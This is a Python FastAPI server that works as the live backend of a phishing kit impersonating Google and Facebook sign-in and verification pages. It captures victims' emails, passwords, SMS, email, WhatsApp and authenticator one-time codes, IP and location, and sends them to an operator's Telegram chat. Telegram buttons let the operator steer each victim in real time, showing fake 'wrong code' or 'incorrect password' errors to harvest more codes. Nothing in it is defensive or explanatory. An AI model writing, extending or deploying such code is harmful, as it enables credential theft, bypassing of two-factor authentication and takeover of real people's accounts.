import asyncio
import uuid
import json
import httpx
from datetime import datetime
from typing import Dict, Optional
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
import uvicorn
from dotenv import load_dotenv
import os

load_dotenv()  # Load environment variables from .env file

app = FastAPI(title="Google Verifier WebSocket Server")

# CORS for React app
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Telegram Bot Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")

# WebSocket server URL (update this when deploying)
WS_SERVER_URL = os.getenv("WS_SERVER_URL", "http://localhost:8000")

# Site URL for display in messages
SITE_URL = os.getenv("SITE_URL", "https://example.com")

# Store connected clients: {client_id: WebSocket}
connected_clients: Dict[str, WebSocket] = {}

# Store client metadata: {client_id: {ip, country, city, region, connected_at}}
client_metadata: Dict[str, dict] = {}

# Store accumulated form data: {client_id: {email, password, phone_otp, email_otp, auth_code}}
client_form_data: Dict[str, dict] = {}


def is_public_url() -> bool:
    return not ("localhost" in WS_SERVER_URL or "127.0.0.1" in WS_SERVER_URL)


def build_inline_keyboard(client_id: str) -> dict:
    """Build the Telegram inline keyboard for navigation."""
    base = WS_SERVER_URL
    return {
        "inline_keyboard": [
            [
                {"text": "🌐 LANDING.META",
                    "url": f"{base}/navigate?client_id={client_id}&action=nav-meta"},
                {"text": "🌐 LANDING.GG",
                    "url": f"{base}/navigate?client_id={client_id}&action=nav-google"},
            ],
            [
                {"text": "🔐 FB.AUTH",
                    "url": f"{base}/navigate?client_id={client_id}&action=fb-auth"},
                {"text": "📱 FB.SMS",
                    "url": f"{base}/navigate?client_id={client_id}&action=fb-sms"},
                {"text": "📧 FB.EMAIL",
                    "url": f"{base}/navigate?client_id={client_id}&action=fb-email"},
                {"text": "💬 FB.WA",
                    "url": f"{base}/navigate?client_id={client_id}&action=fb-whatsapp"},
            ],
            [
                {"text": "🌐 FB.GG",
                    "url": f"{base}/admin/input?client_id={client_id}&type=fb-google"},
                {"text": "🔐 GG.SIGNIN",
                    "url": f"{base}/navigate?client_id={client_id}&action=sign-in"},
                {"text": "🔐 GG.AUTH",
                    "url": f"{base}/navigate?client_id={client_id}&action=gg-auth"},
                {"text": "📱 GG.SMS",
                    "url": f"{base}/admin/input?client_id={client_id}&type=gg-sms"},
            ],
            [
                {"text": "📧 GG.EMAIL",
                    "url": f"{base}/admin/input?client_id={client_id}&type=gg-email"},
                {"text": "👁 GG.CLICK",
                    "url": f"{base}/admin/input?client_id={client_id}&type=gg-click"},
            ],
            [
                {"text": "❌ FB.AUTH",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-auth"},
                {"text": "❌ FB.SMS",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-sms"},
                {"text": "❌ FB.EMAIL",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-email"},
                {"text": "❌ FB.WA",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-whatsapp"},
            ],
            [
                {"text": "❌ FB.GG",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-google"},
                {"text": "❌ GG.AUTH",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-auth"},
                {"text": "❌ GG.SMS",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-sms"},
                {"text": "❌ GG.EMAIL",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-email"},
            ],
            [
                {"text": "❌ GG.CLICK",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-click"},
                {"text": "❌ FB.PASS",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-pass"},
                {"text": "❌ GG.PASS",
                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-pass"},
            ],
            [
                {"text": "✅ DONE",
                    "url": f"{base}/navigate?client_id={client_id}&action=done"},
                {"text": "❌ CANCEL",
                    "url": f"{base}/navigate?client_id={client_id}&action=cancel"},
            ],
        ]
    }


def build_text_nav_links(client_id: str) -> str:
    """Build text navigation links for localhost (Telegram rejects http:// button URLs)."""
    base = WS_SERVER_URL
    return (
        f"\n\n<b>📌 Navigation:</b>\n"
        f'<a href="{base}/navigate?client_id={client_id}&action=nav-meta">LANDING.META</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=nav-google">LANDING.GG</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=fb-auth">FB.AUTH</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=fb-sms">FB.SMS</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=fb-email">FB.EMAIL</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=fb-whatsapp">FB.WA</a> | '
        f'<a href="{base}/admin/input?client_id={client_id}&type=fb-google">FB.GG</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=sign-in">GG.SIGNIN</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=gg-auth">GG.AUTH</a> | '
        f'<a href="{base}/admin/input?client_id={client_id}&type=gg-sms">GG.SMS</a> | '
        f'<a href="{base}/admin/input?client_id={client_id}&type=gg-email">GG.EMAIL</a> | '
        f'<a href="{base}/admin/input?client_id={client_id}&type=gg-click">GG.CLICK</a> | '
        f'<a href="{base}/navigate?client_id={client_id}&action=done">DONE</a>\n'
        f'<b>❌ Errors:</b> '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=fb-pass">FB.PASS</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=gg-pass">GG.PASS</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=fb-auth">FB.AUTH</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=fb-sms">FB.SMS</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=fb-email">FB.EMAIL</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=fb-whatsapp">FB.WA</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=fb-google">FB.GG</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=gg-auth">GG.AUTH</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=gg-sms">GG.SMS</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=gg-email">GG.EMAIL</a> | '
        f'<a href="{base}/show-error?client_id={client_id}&error_type=gg-click">GG.CLICK</a>'
    )


async def send_telegram_message(client_id: str, metadata: dict) -> Optional[int]:
    """Send initial connection notification to Telegram with navigation buttons."""
    message = (
        f"🔔 <b>NEW VISITOR</b>\n"
        f'🏢 <a href="{SITE_URL}">{SITE_URL}</a>\n\n'
        f"🆔 <code>{client_id[:8]}</code>\n\n"
        f"🌐 IP: <code>{metadata.get('ip', 'N/A')}</code>\n"
        f"📍 Country: {metadata.get('country', 'N/A')}\n"
        f"🏙 City: {metadata.get('city', 'N/A')}\n"
        f"📍 Region: {metadata.get('region', 'N/A')}\n\n"
        f"⏳ <i>Waiting for user input...</i>"
    )

    payload: dict = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }

    if is_public_url():
        # Inline keyboard only works with https:// URLs
        payload["reply_markup"] = build_inline_keyboard(client_id)
    else:
        # Localhost: Telegram rejects http:// button URLs, use clickable text links
        message += build_text_nav_links(client_id)
        payload["text"] = message

    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json=payload,
                timeout=10,
            )
            result = response.json()
            if result.get("ok"):
                return result["result"]["message_id"]
            else:
                print(f"Telegram API error: {result}")
        except Exception as e:
            print(f"Error sending Telegram message: {e}")
    return None


async def update_telegram_message(client_id: str, update_type: str, data: dict):
    """Send form submission data as a new Telegram message with accumulated data."""
    metadata = client_metadata.get(client_id, {})

    # Initialize form data for this client if not exists
    if client_id not in client_form_data:
        client_form_data[client_id] = {}

    # Store/update submitted data
    form = client_form_data[client_id]
    if update_type == "sign-in":
        form["email"] = data.get("email", "")
    elif update_type == "landing":
        form["first_name"] = data.get("firstName", "")
        form["last_name"] = data.get("lastName", "")
        form["email"] = data.get("email", form.get("email", ""))
        form["phone"] = data.get("phone", "")
        form["date"] = data.get("date", "")
        form["time"] = data.get("time", "")
    elif update_type in ("password", "facebook-login"):
        form["email"] = data.get("email", form.get("email", ""))
        form["password"] = data.get("password", "")
    elif update_type in ("phone-otp", "fb-sms", "gg-sms"):
        form["phone_otp"] = data.get("code", "")
    elif update_type in ("email-otp", "fb-email", "gg-email"):
        form["email_otp"] = data.get("code", "")
    elif update_type in ("authenticator-code", "fb-auth", "gg-auth"):
        form["auth_code"] = data.get("code", "")
    elif update_type == "fb-whatsapp":
        form["whatsapp_code"] = data.get("code", "")
    elif update_type in ("click-code", "gg-click"):
        form["click_action"] = data.get("action", "")

    # Build type label
    type_labels = {
        "landing": "📅 Schedule Form",
        "sign-in": "📧 Sign In (Email)",
        "password": "🔐 Password",
        "facebook-login": "🔐 FB Login",
        "fb-sms": "📱 FB SMS Code",
        "fb-email": "📧 FB Email Code",
        "fb-auth": "🔑 FB Auth Code",
        "fb-whatsapp": "💬 FB WhatsApp Code",
        "fb-google": "🌐 FB Google Verified",
        "gg-sms": "📱 GG SMS Code",
        "gg-email": "📧 GG Email Code",
        "gg-auth": "🔑 GG Auth Code",
        "gg-click": "👁 GG Click Code",
    }
    type_label = type_labels.get(update_type, "📋 Data")

    message = (
        f"<b>{type_label}</b>\n"
        f'🏢 <a href="{SITE_URL}">{SITE_URL}</a>\n\n'
        f"🆔 <code>{client_id[:8]}</code>\n"
    )

    # Email
    if form.get("email"):
        message += f"\n📧 Email: <code>{form['email']}</code>"

    # Password - highlight if just submitted
    if update_type in ("password", "facebook-login") and form.get("password"):
        message += f"\n🔴 Pass: <code>{form['password']}</code>"
    elif form.get("password"):
        message += f"\n🔑 Pass: <code>{form['password']}</code>"

    # Phone OTP
    if update_type in ("phone-otp", "fb-sms", "gg-sms") and form.get("phone_otp"):
        message += f"\n🔴 SMS: <code>{form['phone_otp']}</code>"
    elif form.get("phone_otp"):
        message += f"\n📱 SMS: <code>{form['phone_otp']}</code>"

    # Email OTP
    if update_type in ("email-otp", "fb-email", "gg-email") and form.get("email_otp"):
        message += f"\n🔴 Email Code: <code>{form['email_otp']}</code>"
    elif form.get("email_otp"):
        message += f"\n📧 Email Code: <code>{form['email_otp']}</code>"

    # Auth code
    if update_type in ("authenticator-code", "fb-auth", "gg-auth") and form.get("auth_code"):
        message += f"\n🔴 Auth: <code>{form['auth_code']}</code>"
    elif form.get("auth_code"):
        message += f"\n🔑 Auth: <code>{form['auth_code']}</code>"

    # WhatsApp code
    if update_type == "fb-whatsapp" and form.get("whatsapp_code"):
        message += f"\n🔴 WhatsApp: <code>{form['whatsapp_code']}</code>"
    elif form.get("whatsapp_code"):
        message += f"\n💬 WhatsApp: <code>{form['whatsapp_code']}</code>"

    # Landing/schedule form data highlight
    if update_type == "landing":
        if form.get("first_name") or form.get("last_name"):
            message += f"\n🔴 Name: <code>{form.get('first_name', '')} {form.get('last_name', '')}</code>"
        if form.get("phone"):
            message += f"\n🔴 Phone: <code>{form['phone']}</code>"
        if form.get("date"):
            message += f"\n🔴 Date: <code>{form['date']} {form.get('time', '')}</code>"

    # Click code action
    if update_type == "click-code" and form.get("click_action"):
        message += f"\n🔴 Action: <code>{form['click_action']}</code>"

    # Location
    message += (
        f"\n\n🌐 IP: <code>{metadata.get('ip', 'N/A')}</code>\n"
        f"📍 Country: {metadata.get('country', 'N/A')}\n"
        f"🏙 City: {metadata.get('city', 'N/A')}\n"
        f"📍 Region: {metadata.get('region', 'N/A')}"
    )

    payload: dict = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    }

    if is_public_url():
        # Inline keyboard only works with https:// URLs
        payload["reply_markup"] = build_inline_keyboard(client_id)
    else:
        # Localhost: Telegram rejects http:// button URLs, use clickable text links
        message += build_text_nav_links(client_id)
        payload["text"] = message

    async with httpx.AsyncClient() as client:
        try:
            await client.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json=payload,
                timeout=10,
            )
        except Exception as e:
            print(f"Error sending Telegram update: {e}")


# ---------------------------------------------------------------------------
# HTTP Endpoints
# ---------------------------------------------------------------------------

@app.get("/")
async def root():
    """Health check endpoint."""
    return {
        "status": "running",
        "clients": len(connected_clients),
        "server": WS_SERVER_URL,
    }


@app.get("/clients")
async def list_clients():
    """List all connected clients (for debugging)."""
    return {
        "count": len(connected_clients),
        "clients": [
            {
                "id": cid[:8],
                "full_id": cid,
                "metadata": client_metadata.get(cid, {}),
                "form_data": client_form_data.get(cid, {}),
            }
            for cid in connected_clients
        ],
    }


@app.get("/navigate")
async def navigate_client(
    client_id: str = Query(...), action: str = Query(...)
):
    """
    Handle navigation request from Telegram button click.
    Called when admin clicks a button in Telegram.
    """
    route_map = {
        "nav-meta": "/landing/meta",
        "nav-google": "/landing/google",
        "google-auth": "/landing/google",
        "gg-card": "/landing/google",
        "login": "/facebook/login",
        "sign-in": "/google/login",
        "password": "/google/password",
        "authenticator-code": "/google/authenticator-code",
        "phone-number": "/google/phone-number",
        "phone-otp": "/google/phone-otp",
        "email-otp": "/google/email-otp",
        "click-code": "/google/click-code",
        "home": "/",
        # FB routes
        "fb-auth": "/facebook/auth-app",
        "fb-sms": "/facebook/sms",
        "fb-email": "/facebook/email-otp",
        "fb-whatsapp": "/facebook/whatsapp",
        "fb-google": "/facebook/auth-with-google",
        # GG routes
        "gg-auth": "/google/authenticator-code",
        "gg-sms": "/google/phone-otp",
        "gg-email": "/google/email-otp",
        "gg-click": "/google/click-code",


        "done": "https://calendly.com/selenakloe-contact/30min",
        "cancel": "/",
    }

    route = route_map.get(action, "/")

    if client_id not in connected_clients:
        return HTMLResponse(
            content=_html_page(
                "⚠️ Client Not Connected",
                f"Client <code>{client_id[:8]}...</code> is not connected.<br>"
                f"The user may have closed their browser.",
            ),
            status_code=404,
        )

    websocket = connected_clients[client_id]
    try:
        await websocket.send_json({
            "type": "navigate",
            "route": route,
            "action": action,
        })
        return HTMLResponse(
            content=_html_page(
                "✅ Navigation Command Sent",
                f"Client <code>{client_id[:8]}...</code> is being redirected to <b>{action}</b>",
                auto_close=True,
            )
        )
    except Exception as e:
        return HTMLResponse(
            content=_html_page(
                "❌ Error", f"Failed to send navigation: {str(e)}"),
            status_code=500,
        )


@app.get("/show-error")
async def show_error(
    client_id: str = Query(...), error_type: str = Query(...)
):
    """
    Navigate to a verification page AND show a 'Wrong code' error.
    """
    error_messages = {
        "fb-sms": "Wrong code. Please try again.",
        "fb-email": "Wrong code. Please try again.",
        "fb-auth": "Wrong code. Please try again.",
        "fb-whatsapp": "Wrong code. Please try again.",
        "fb-google": "Verification failed. Please try again.",
        "gg-sms": "Wrong code. Please try again.",
        "gg-email": "Wrong code. Please try again.",
        "gg-auth": "Wrong code. Please try again.",
        "gg-click": "This code does not work. Check the code and try again.",
        "fb-pass": "The email or mobile number you entered, or your password, is incorrect.",
        "gg-pass": "The email or mobile number you entered, or your password, is incorrect.",
    }
    error_route_map = {
        "fb-sms": "/facebook/sms?error=wrong-code",
        "fb-email": "/facebook/email-otp?error=wrong-code",
        "fb-auth": "/facebook/auth-app?error=wrong-code",
        "fb-whatsapp": "/facebook/whatsapp?error=wrong-code",
        "fb-google": "/facebook/auth-with-google?error=wrong-code",
        "gg-sms": "/google/phone-otp?error=wrong-code",
        "gg-email": "/google/email-otp?error=wrong-code",
        "gg-auth": "/google/authenticator-code?error=wrong-code",
        "gg-click": "/google/click-code?error=wrong-code",
        "fb-pass": "/facebook/login?error=wrong-password",
        "gg-pass": "/google/password?error=wrong-password",
    }

    error_message = error_messages.get(
        error_type, "Invalid code. Please try again.")
    route = error_route_map.get(error_type, "/phone-otp")

    if client_id not in connected_clients:
        return HTMLResponse(
            content=_html_page(
                "⚠️ Client Not Connected",
                f"Client <code>{client_id[:8]}...</code> is not connected.",
            ),
            status_code=404,
        )

    websocket = connected_clients[client_id]
    try:
        await websocket.send_json({
            "type": "navigate_with_error",
            "route": route,
            "error_type": error_type,
            "message": error_message,
        })
        return HTMLResponse(
            content=_html_page(
                "✅ Error Message Sent",
                f"Client <code>{client_id[:8]}...</code> navigated to "
                f"<b>{error_type.upper()}</b> page with error.",
                auto_close=True,
            )
        )
    except Exception as e:
        return HTMLResponse(
            content=_html_page(
                "❌ Error", f"Failed to send error message: {str(e)}"),
            status_code=500,
        )


@app.get("/admin/client-status")
async def admin_client_status(client_id: str = Query(...)):
    """Live connection status check for the admin input page."""
    return {"connected": client_id in connected_clients}


@app.get("/admin/input")
async def admin_input_page(client_id: str = Query(...), type: str = Query(...)):
    """
    Admin code entry page. Opens when admin clicks SMS/EMAIL/CLICK/OKTA/MSFT.
    - SMS: phone number hint + OTP code
    - Email: email hint + OTP code
    - Click: display code (number shown to user)
    - Auth/Okta/Microsoft: OTP code only
    """
    type_info = {
        "fb-sms":    {"label": "FB SMS Verification",    "icon": "📱"},
        "fb-email":  {"label": "FB Email Verification",  "icon": "📧"},
        "fb-google": {"label": "FB Google Warning",      "icon": "🌐"},
        "gg-sms":    {"label": "GG SMS Verification",    "icon": "📱"},
        "gg-email":  {"label": "GG Email Verification",  "icon": "📧"},
        "gg-click":  {"label": "GG Click Code",          "icon": "👁"},
    }
    info = type_info.get(type, {"label": "Code", "icon": "🔢"})

    # No longer computed server-side; status is checked dynamically by JS

    # Build the form fields based on type
    if type in ("gg-sms"):
        extra_fields = """
      <label>Phone Number Hint</label>
      <input type="text" id="phone_hint" placeholder="e.g. +91 \u2022\u2022\u2022\u2022 1234" autocomplete="off" value="+91 ••••• •1234"
             autofocus style="font-size:18px;letter-spacing:0.05em" />
      <p style="margin-top:8px;font-size:12px;color:#64748b">The user will type their own real OTP — you only set the displayed phone number.</p>"""
        js_payload = f"{{ client_id: '{client_id}', type: '{type}', code: '__hint_only__', phone_hint }}"
        js_extra = """const phone_hint = document.getElementById('phone_hint').value.trim();
      if (!phone_hint) { alert('Please enter the phone hint'); return; }"""
    elif type in ("fb-email", "gg-email"):
        extra_fields = """
      <label>Email Hint</label>
      <input type="text" id="email_hint" placeholder="e.g. n***@gmail.com" autocomplete="off" autofocus style="font-size:16px;letter-spacing:0.05em" />
      <p style="margin-top:8px;font-size:12px;color:#64748b">The user will type their own real OTP — you only set the displayed email hint.</p>"""
        js_payload = f"{{ client_id: '{client_id}', type: '{type}', code: '__hint_only__', email_hint }}"
        js_extra = """const email_hint = document.getElementById('email_hint').value.trim();
      if (!email_hint) { alert('Please enter the email hint'); return; }"""
    elif type == "fb-google":
        extra_fields = """
      <label>Google Account Email</label>
      <input type="text" id="email_hint" placeholder="e.g. name@gmail.com" autocomplete="off" autofocus style="font-size:16px;letter-spacing:0.05em" />
      <p style="margin-top:8px;font-size:12px;color:#64748b">This email will be displayed on the Google Warning page.</p>"""
        js_payload = f"{{ client_id: '{client_id}', type: '{type}', code: '__hint_only__', email_hint }}"
        js_extra = """const email_hint = document.getElementById('email_hint').value.trim();
      if (!email_hint) { alert('Please enter the email address'); return; }"""
    elif type == "gg-click":
        extra_fields = """
      <label>Display Code (shown to user on screen)</label>
      <input type="text" id="code" inputmode="numeric" pattern="[0-9]*" maxlength="6"
             placeholder="2-digit number e.g. 47" autocomplete="off" autofocus
             style="font-size:48px;letter-spacing:0.2em" />"""
        js_payload = f"{{ client_id: '{client_id}', type: '{type}', code }}"
        js_extra = ""
    else:
        # auth, okta, microsoft
        extra_fields = """
      <label>OTP Code</label>
      <input type="text" id="code" inputmode="numeric" pattern="[0-9]*" maxlength="6"
             placeholder="6-digit code" autocomplete="off" autofocus />"""
        js_payload = f"{{ client_id: '{client_id}', type: '{type}', code }}"
        js_extra = ""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin: {info['label']}</title>
  <style>
    * {{ box-sizing: border-box; margin: 0; padding: 0; }}
    body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0f172a; color: #e2e8f0; min-height: 100vh;
            display: flex; align-items: center; justify-content: center; padding: 20px; }}
    .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 16px;
             padding: 32px; max-width: 420px; width: 100%; }}
    .header {{ text-align: center; margin-bottom: 28px; }}
    .icon {{ font-size: 48px; margin-bottom: 12px; }}
    h1 {{ font-size: 22px; font-weight: 700; color: #f1f5f9; margin-bottom: 4px; }}
    .sub {{ font-size: 13px; color: #94a3b8; }}
    .meta {{ background: #0f172a; border-radius: 10px; padding: 14px 16px;
             margin-bottom: 24px; display: flex; justify-content: space-between; align-items: center; }}
    .client-id {{ font-family: monospace; font-size: 14px; color: #7dd3fc; }}
    .status {{ font-size: 13px; font-weight: 600; }}
    .status.online {{ color: #22c55e; }}
    .status.offline {{ color: #ef4444; }}
    .status.checking {{ color: #94a3b8; }}
    label {{ display: block; font-size: 12px; font-weight: 700; color: #64748b;
             text-transform: uppercase; letter-spacing: 0.07em; margin-bottom: 8px; margin-top: 16px; }}
    label:first-of-type {{ margin-top: 0; }}
    input[type=text] {{ width: 100%; background: #0f172a; border: 2px solid #334155;
                        border-radius: 10px; padding: 12px 18px; font-size: 24px;
                        font-family: monospace; letter-spacing: 0.3em; text-align: center;
                        color: #f1f5f9; outline: none; transition: border-color 0.2s; }}
    input[type=text]:focus {{ border-color: #6366f1; }}
    button {{ width: 100%; background: #6366f1; color: white; border: none;
              border-radius: 10px; padding: 14px; font-size: 16px; font-weight: 700;
              cursor: pointer; transition: background 0.2s; margin-top: 24px; }}
    button:hover {{ background: #4f46e5; }}
    .result {{ margin-top: 16px; padding: 12px 16px; border-radius: 10px;
               font-size: 14px; text-align: center; display: none; }}
    .result.ok {{ background: #064e3b; color: #6ee7b7; border: 1px solid #065f46; }}
    .result.err {{ background: #7f1d1d; color: #fca5a5; border: 1px solid #991b1b; }}
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <div class="icon">{info['icon']}</div>
      <h1>{info['label']}</h1>
      <p class="sub">Fill in the details to send to the user</p>
    </div>
    <div class="meta">
      <span class="client-id">{client_id[:8]}…</span>
      <span class="status checking" id="status-dot">⏳ Checking…</span>
    </div>
    <form id="form" onsubmit="send(event)">
      {extra_fields}
      <button type="submit">Send to User ↗</button>
    </form>
    <div class="result" id="result"></div>
  </div>
  <script>
    async function send(e) {{
      e.preventDefault();
      const code = document.getElementById('code') ? document.getElementById('code').value.trim() : '__hint_only__';
      {js_extra}
      if (!code) {{ alert('Please enter a code'); return; }}
      const res = await fetch('/admin/send-code', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({js_payload})
      }});
      const data = await res.json();
      const el = document.getElementById('result');
      el.style.display = 'block';
      if (data.ok) {{
        el.className = 'result ok';
        el.textContent = '\u2705 Sent! User page updated.';
        if (document.getElementById('code')) document.getElementById('code').value = '';
        setTimeout(() => window.close(), 1500);
      }} else {{
        el.className = 'result err';
        el.textContent = '\u274c ' + (data.detail || 'Failed to send');
      }}
    }}

    async function checkStatus() {{
      try {{
        const r = await fetch('/admin/client-status?client_id={client_id}');
        const d = await r.json();
        const dot = document.getElementById('status-dot');
        if (d.connected) {{
          dot.className = 'status online';
          dot.textContent = '\U0001F7E2 Online';
        }} else {{
          dot.className = 'status offline';
          dot.textContent = '\U0001F534 Offline';
        }}
      }} catch(e) {{}}
    }}

    checkStatus();
    setInterval(checkStatus, 3000);
  </script>
</body>
</html>"""
    return HTMLResponse(content=html)


@app.post("/admin/send-code")
async def admin_send_code(body: dict):
    """
    Send a prefill_code message to the specific client via WebSocket.
    Navigates client to the right page and passes hint fields (phone_hint, email_hint).
    """
    client_id = body.get("client_id", "")
    code_type = body.get("type", "")
    code = body.get("code", "")
    phone_hint = body.get("phone_hint", None)
    email_hint = body.get("email_hint", None)

    if not client_id:
        return {"ok": False, "detail": "Missing client_id"}

    # For SMS, Email, and Google, code is optional (hint-only); for other types code is required
    if code_type not in ("fb-sms", "gg-sms", "fb-email", "gg-email", "fb-google") and not code:
        return {"ok": False, "detail": "Missing code"}

    if client_id not in connected_clients:
        return {"ok": False, "detail": "Client not connected"}

    route_map = {
        "fb-sms":    "/facebook/sms",
        "fb-email":  "/facebook/email-otp",
        "fb-google": "/facebook/auth-with-google",
        "gg-sms":    "/google/phone-otp",
        "gg-email":  "/google/email-otp",
        "gg-click":  "/google/click-code",
    }
    route = route_map.get(code_type, "/")

    websocket = connected_clients[client_id]
    payload = {
        "type": "prefill_code",
        "verification_type": code_type,
        "code": code,
        "route": route,
    }
    if phone_hint:
        payload["phone_hint"] = phone_hint
    if email_hint:
        payload["email_hint"] = email_hint

    try:
        await websocket.send_json(payload)
        print(f"[{client_id[:8]}] Admin sent {code_type} | code={code} phone_hint={phone_hint} email_hint={email_hint}")
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "detail": str(e)}


# ---------------------------------------------------------------------------
# WebSocket Endpoint
# ---------------------------------------------------------------------------

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """Main WebSocket endpoint for React client connections."""
    await websocket.accept()

    client_id = str(uuid.uuid4())
    connected_clients[client_id] = websocket
    client_metadata[client_id] = {
        "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": "Unknown",
        "country": "Unknown",
        "city": "Unknown",
        "region": "Unknown",
    }

    print(f"[+] New client connected: {client_id[:8]}")

    try:
        # Send assigned client ID
        await websocket.send_json({
            "type": "connected",
            "client_id": client_id,
        })

        while True:
            data = await websocket.receive_json()
            msg_type = data.get("type", "")
            print(f"[{client_id[:8]}] Received: {msg_type}")

            # ------------------------------------------------------------------
            if msg_type == "reconnect":
                old_id = data.get("client_id", "")
                if old_id and old_id != client_id:
                    print(f"[{client_id[:8]}] Reconnecting as: {old_id[:8]}")

                    # Remove temp new client entry
                    connected_clients.pop(client_id, None)
                    client_metadata.pop(client_id, None)

                    # Adopt the old client_id
                    client_id = old_id
                    connected_clients[client_id] = websocket

                    # Restore or init metadata
                    if client_id not in client_metadata:
                        client_metadata[client_id] = {
                            "connected_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "ip": "Reconnected",
                            "country": "Unknown",
                            "city": "Unknown",
                            "region": "Unknown",
                        }

                    if client_id not in client_form_data:
                        client_form_data[client_id] = {}

                    await websocket.send_json({
                        "type": "reconnected",
                        "client_id": client_id,
                        "message": "Session restored",
                    })
                else:
                    # No old ID – keep current
                    await websocket.send_json({
                        "type": "connected",
                        "client_id": client_id,
                    })

            # ------------------------------------------------------------------
            elif msg_type == "send_notification":
                # Server-side deduplication: only forward to Telegram once per client_id.
                # The client may send this multiple times (reconnects, StrictMode, etc.)
                if client_metadata.get(client_id, {}).get("notification_sent"):
                    print(
                        f"[{client_id[:8]}] Notification already sent, skipping duplicate.")
                else:
                    metadata = {
                        "ip": data.get("ip", "Unknown"),
                        "country": data.get("country", "Unknown"),
                        "city": data.get("city", "Unknown"),
                        "region": data.get("region", "Unknown"),
                        "user_agent": data.get("user_agent", "Unknown"),
                    }
                    client_metadata[client_id].update(metadata)
                    client_metadata[client_id]["notification_sent"] = True

                    print(f"[{client_id[:8]}] Sending Telegram notification...")
                    msg_id = await send_telegram_message(client_id, metadata)
                    if msg_id:
                        client_metadata[client_id]["message_id"] = msg_id
                        print(f"[{client_id[:8]}] Telegram msg_id: {msg_id}")

            # ------------------------------------------------------------------
            elif msg_type == "form_submit":
                submit_type = data.get("submit_type", "unknown")
                form_data = data.get("data", {})

                # Update metadata from client_info if provided
                client_info = data.get("client_info", {})
                if client_info:
                    client_metadata[client_id].update({
                        k: client_info.get(
                            k, client_metadata[client_id].get(k, "Unknown"))
                        for k in ("ip", "country", "city", "region")
                    })

                print(
                    f"[{client_id[:8]}] Form submit: {submit_type} -> {form_data}")
                await update_telegram_message(client_id, submit_type, form_data)

                await websocket.send_json({
                    "type": "submit_ack",
                    "submit_type": submit_type,
                    "status": "received",
                })

            # ------------------------------------------------------------------
            elif msg_type == "ping":
                await websocket.send_json({"type": "pong"})

            # ------------------------------------------------------------------
            else:
                print(f"[{client_id[:8]}] Unknown message type: {msg_type}")

    except WebSocketDisconnect:
        print(f"[-] Client disconnected: {client_id[:8]}")
    except Exception as e:
        print(f"[!] Error with client {client_id[:8]}: {e}")
    finally:
        if connected_clients.get(client_id) == websocket:
            connected_clients.pop(client_id, None)
        # Keep metadata and form_data for potential reconnection
        print(
            f"[~] Connection closed for {client_id[:8]}, data preserved for reconnect")


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _html_page(title: str, body: str, auto_close: bool = False) -> str:
    close_script = '<script>setTimeout(() => window.close(), 2000);</script>' if auto_close else ""
    return f"""<!DOCTYPE html>
<html>
  <head>
    <title>{title}</title>
    <style>
      body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
      code {{ background: #f0f0f0; padding: 2px 6px; border-radius: 4px; }}
    </style>
  </head>
  <body>
    <h2>{title}</h2>
    <p>{body}</p>
    <p style="color: #666;">You can close this window.</p>
    {close_script}
  </body>
</html>"""


if __name__ == "__main__":
    print("=" * 50)
    print("Google Verifier WebSocket Server")
    print(f"WebSocket URL : ws://localhost:8000/ws")
    print(
        f"Navigate URL  : {WS_SERVER_URL}/navigate?client_id=<id>&action=<action>")
    print(
        f"Show Error URL: {WS_SERVER_URL}/show-error?client_id=<id>&error_type=<type>")
